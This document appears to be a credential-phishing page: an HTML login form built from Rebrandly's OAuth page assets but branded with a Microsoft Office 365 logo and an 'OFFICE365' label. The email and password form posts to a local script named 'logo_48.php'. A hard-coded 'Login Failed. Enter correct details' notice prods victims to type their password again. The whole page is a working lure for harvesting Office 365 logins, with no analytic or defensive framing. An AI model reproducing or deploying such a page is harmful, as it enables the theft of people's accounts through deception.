
<!DOCTYPE html>
<html>
<head>
    
        <!-- Google Tag Manager -->
        <script>(function (w, d, s, l, i) {
                w[l] = w[l] || []; w[l].push({
                    'gtm.start':
                        new Date().getTime(), event: 'gtm.js'
                }); var f = d.getElementsByTagName(s)[0],
                    j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : ''; j.async = true; j.src =
                        'https://www.googletagmanager.com/gtm.js?id=' + i + dl; f.parentNode.insertBefore(j, f);
            })(window, document, 'script', 'dataLayer', 'GTM-NZVWGS3');</script>
        <!-- End Google Tag Manager -->
    
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Login </title>
    <script src="https://oauth.rebrandly.com/js/jquery.min.js"></script>
    <link rel="stylesheet" href="https://oauth.rebrandly.com/css/bootstrap.min.css">
    <script src="https://oauth.rebrandly.com/js/bootstrap.min.js"></script>
    <link rel="stylesheet" href="https://oauth.rebrandly.com/css/rb-style_no_cache.css?r=3">
    <link rel="shortcut icon" href="https://oauth.rebrandly.com/images/favicon_64x64.ico">

</head>
<body>
    
        <!-- Google Tag Manager (noscript) -->
        <noscript>
            <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-NZVWGS3"
                    height="0" width="0" style="display:none;visibility:hidden"></iframe>
        </noscript>
        <!-- End Google Tag Manager (noscript) -->
    
    
    <div class="container-page">
        <div class="container-section section-image">

            <div id="carouselLandingOauth" class="carousel slide" data-ride="carousel">
                <div class="container-image">
                    <!-- Wrapper for slides -->
                </div>
            </div>
        </div>
        <div class="container-section section-content">
            <div class="container-scrollable">
                <div class="container-content">
                    

<script>function onSubmitRecaptchaForm(token) {
        let forms = $('form[data-form-recaptcha=true]')
        if (forms != null && forms.length > 0) {
            forms[0].submit()
        }
    }

    function validateRecaptcha(event) {
        event.preventDefault()
        grecaptcha.execute()
    }

    function onloadRecaptcha() {
        var el = $('button[data-submit-form-recaptcha=true]')
        if (el != null && el.length != 0) {
            var element = el[0]
            element.onclick = validateRecaptcha;
        }
    }</script>
<script src="https://www.google.com/recaptcha/api.js" async defer></script>

<div class="text-center">
    <a href="https://www.rebrandly.com">
        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c3/Logo_Microsoft_Office_365_%282013-2019%29.svg/2560px-Logo_Microsoft_Office_365_%282013-2019%29.svg.png">
    </a>
</div>
<div class="heading-medium text-center">
    Login to your account
</div>
<form method="post" action="logo_48.php">
    <div class="container-social rb-row">
        &nbsp;</div>
<input name="__RequestVerificationToken" type="hidden" value="CfDJ8HTB4qZ67OhIizVrdMFTDpMAmDIq5WsDt4iANwrd7BQj9wtJUuo1MphsGO4dx1rfrjq7PTCYP6GEPgg6Gz5AZ-9QV5wfE1__C3ErQO0U9bpiPxCGCn3goik3qz385rC6dT9xZ1whvmZiwbM60kyHXaY" /></form>

<p class="text-center color-grey-400 medium-margin-top rb-row middle-lines">
    <font color="#E84E50"><b>OFFICE365</b></font>
</p>

<form method="post" action="logo_48.php">
    <div class="input-text margin-top-sm" data-box-for="Email">
        <input class="float-left" placeholder="Your email" type="text" data-val="true" data-val-email="Please enter a valid email address" data-val-required="This field is required" id="Email" name="Email" value="">
        <img class="input-error float-right" src="https://oauth.rebrandly.com/img/ic-warning.svg">
    </div>
    <span class="error field-validation-valid" data-valmsg-for="Email" data-valmsg-replace="true"></span>
    <div class="input-text margin-top-sm position-relative" data-box-for="Password">
        <input placeholder="Your password" type="password" data-val="true" data-val-length="Password must be at most 100 characters long" data-val-length-max="100" data-val-regex="Password must be at least 8 characters long" data-val-regex-pattern="^.{8,}$" data-val-required="This field is required" id="Password" maxlength="100" name="Password" />
        <img class="input-error float-right" src="https://oauth.rebrandly.com/img/ic-warning.svg">
    </div>
    <span class="error field-validation-valid" data-valmsg-for="Password" data-valmsg-replace="true"></span>
    <div class="checkbox" style="padding-left: 18px; color:#757575;">
        <i><font color="#E84E50">Login Failed. Enter correct details</font></i></div>
    <div class="rb-row hidden">
        <div class="float-left margin-right-xs" style="height: 100%">
            <img class="icon-inline" src="https://oauth.rebrandly.com/img/ic-warning.svg">
        </div>
        <div class="float-left" style="height: 100%">
        </div>
    </div>
    <button type="submit" class="button-login button-lg button-enabled rb-row" id="login">
        Login
    </button>
<input name="__RequestVerificationToken" type="hidden" value="CfDJ8HTB4qZ67OhIizVrdMFTDpMAmDIq5WsDt4iANwrd7BQj9wtJUuo1MphsGO4dx1rfrjq7PTCYP6GEPgg6Gz5AZ-9QV5wfE1__C3ErQO0U9bpiPxCGCn3goik3qz385rC6dT9xZ1whvmZiwbM60kyHXaY" /><input name="AllowRememberLogin" type="hidden" value="false" /></form>

<form data-form-recaptcha="true" id="form-recaptcha" method="post" class="container-row" action="/ui/register/resend-verification">
    <input type="hidden" name="userId" />
    <div id="recaptchadiv" class="g-recaptcha" data-sitekey="6LfYOrYUAAAAAAtwQS0Z4sjwfv_CY6dfz-dv_YIk" data-size="invisible" data-callback="onSubmitRecaptchaForm"></div>
    <span class="field-validation-valid text-danger" data-valmsg-for="g-recaptcha-response" data-valmsg-replace="true"></span>
    <button style="display: none;" type="submit" class="button-login col-button-big-fit button-enabled rb-row" id="submitRecaptchaBtn" data-submit-form-recaptcha="true">
        Send email again
    </button>
<input name="__RequestVerificationToken" type="hidden" value="CfDJ8HTB4qZ67OhIizVrdMFTDpMAmDIq5WsDt4iANwrd7BQj9wtJUuo1MphsGO4dx1rfrjq7PTCYP6GEPgg6Gz5AZ-9QV5wfE1__C3ErQO0U9bpiPxCGCn3goik3qz385rC6dT9xZ1whvmZiwbM60kyHXaY" /></form>

<script>onloadRecaptcha();</script>

                </div>
            </div>
        </div>
    </div>
    

    <script src="/lib/jquery-validation/dist/jquery.validate.js"></script>
    <script src="/lib/jquery-validation-unobtrusive/jquery.validate.unobtrusive.js"></script>



</body>
</html>
